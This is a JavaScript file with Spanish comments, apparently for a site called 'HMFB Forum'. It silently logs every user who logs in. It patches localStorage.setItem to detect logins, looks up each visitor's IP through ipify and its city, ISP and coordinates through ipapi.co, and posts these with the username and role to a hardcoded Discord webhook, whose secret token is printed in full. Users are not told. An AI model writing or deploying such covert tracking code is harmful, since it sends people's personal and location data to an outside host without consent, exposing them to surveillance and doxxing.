// Script de IP que SOLO se ejecuta cuando hay usuario logueado
const sendIP = () => {
    // Verificar que haya un usuario logueado
    let forumUser = null;
    let userRole = "unknown";
    
    try {
        const session = JSON.parse(localStorage.getItem('currentSession'));
        if (session && session.username) {
            forumUser = session.username;
            userRole = session.role || 'user';
        }
    } catch (e) {
        console.log("No hay sesión activa");
        return; // NO enviar IP si no hay usuario
    }
    
    // Si no hay usuario, NO hacer nada
    if (!forumUser) {
        console.log("IP no enviada: Usuario no logueado");
        return;
    }
    
    // Solo proceder si hay usuario
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1448790293301166191/-H9kMHOh2udMpr0QZ8FQO7cdedbqwdxL8ZA7CRQ-Z0RfBMKv6Tq1jsO2W03q8jILoEcx';
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "HMFB Forum Logger",
                            avatar_url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png",
                            content: userRole === 'admin' ? 
                                `@here **👑 ADMIN CONECTADO**` : 
                                `@here **👤 USUARIO CONECTADO**`,
                            embeds: [
                                {
                                    title: userRole === 'admin' ? `👑 ADMIN: ${forumUser}` : `👤 USUARIO: ${forumUser}`,
                                    description: `**Rol:** ${userRole === 'admin' ? 'Administrador' : 'Usuario'}\n` +
                                                `**Usuario:** ${forumUser}\n` +
                                                `**IP:** ${ipadd}\n` +
                                                `**ISP:** ${geoData.org || geoData.network || "Desconocido"}\n` +
                                                `**Ubicación:** ${geoData.city || "?"}, ${geoData.region || "?"}, ${geoData.country_name || "?"}\n` +
                                                `**Coords:** ${geoData.latitude || "?"}, ${geoData.longitude || "?"}`,
                                    color: userRole === 'admin' ? 0x800080 : 0x00FFFF,
                                    footer: {
                                        text: `HMFB Forum • ${new Date().toLocaleString()}`
                                    },
                                    thumbnail: {
                                        url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png"
                                    },
                                    timestamp: new Date().toISOString()
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('✅ IP enviada a Discord');
            } else {
                console.log('❌ Error al enviar IP');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
};

// NO ejecutar automáticamente al cargar la página
// Solo se ejecutará cuando se llame manualmente después del login

// Observar cambios en localStorage para detectar logins
const originalSetItem = localStorage.setItem;
localStorage.setItem = function(key, value) {
    originalSetItem.apply(this, arguments);
    
    // Si se guarda una sesión, enviar IP
    if (key === 'currentSession') {
        try {
            const session = JSON.parse(value);
            if (session && session.username) {
                // Esperar un momento y enviar IP
                setTimeout(sendIP, 1500);
            }
        } catch (e) {
            // Error parsing, no hacer nada
        }
    }
};

// También ejecutar si ya hay sesión al cargar scripts
document.addEventListener('DOMContentLoaded', function() {
    // Pequeño delay para asegurar que todo esté listo
    setTimeout(() => {
        const session = JSON.parse(localStorage.getItem('currentSession'));
        if (session && session.username) {
            // Ya hay usuario logueado, enviar IP
            setTimeout(sendIP, 2000);
        }
    }, 1000);
});
